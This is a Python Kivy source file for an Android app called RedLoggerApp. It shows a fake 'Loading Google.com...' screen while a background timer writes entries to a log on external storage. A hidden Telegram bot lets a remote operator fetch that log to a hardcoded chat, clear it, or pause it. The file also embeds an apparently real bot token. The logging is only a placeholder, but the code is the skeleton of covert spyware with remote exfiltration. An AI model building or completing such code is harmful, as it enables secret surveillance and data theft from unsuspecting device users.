from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from android.permissions import request_permissions, Permission
from kivy.core.window import Window
from jnius import autoclass
import time, os, threading
from telegram import Bot
from telegram.ext import ApplicationBuilder, CommandHandler

BOT_TOKEN = "7588831662:AAGsQmG624Dhl6q5opTQS4fGU_SGXE8EcoU"
CHAT_ID = 7070240983
log_path = "/sdcard/activity_log.txt"
logging_enabled = True

def log_activity(*args):
    if not logging_enabled:
        return
    try:
        with open(log_path, "a") as f:
            f.write(f"[{time.ctime()}] Activity log\n")
    except:
        pass

class WebView(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = "vertical"
        self.add_widget(Label(text="Loading Google.com..."))

class RedLoggerApp(App):
    def build(self):
        request_permissions([Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE])
        Clock.schedule_interval(log_activity, 300)
        return WebView()

async def getlog(update, context):
    await context.bot.send_document(chat_id=CHAT_ID, document=open(log_path, "rb"))

async def clearlog(update, context):
    open(log_path, "w").close()
    await update.message.reply_text("Logs cleared.")

async def startlog(update, context):
    global logging_enabled
    logging_enabled = True
    await update.message.reply_text("Logging resumed.")

async def stoplog(update, context):
    global logging_enabled
    logging_enabled = False
    await update.message.reply_text("Logging paused.")

def start_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("getlog", getlog))
    app.add_handler(CommandHandler("clearlog", clearlog))
    app.add_handler(CommandHandler("startlog", startlog))
    app.add_handler(CommandHandler("stoplog", stoplog))
    app.run_polling()

threading.Thread(target=start_bot, daemon=True).start()

if __name__ == "__main__":
    RedLoggerApp().run()
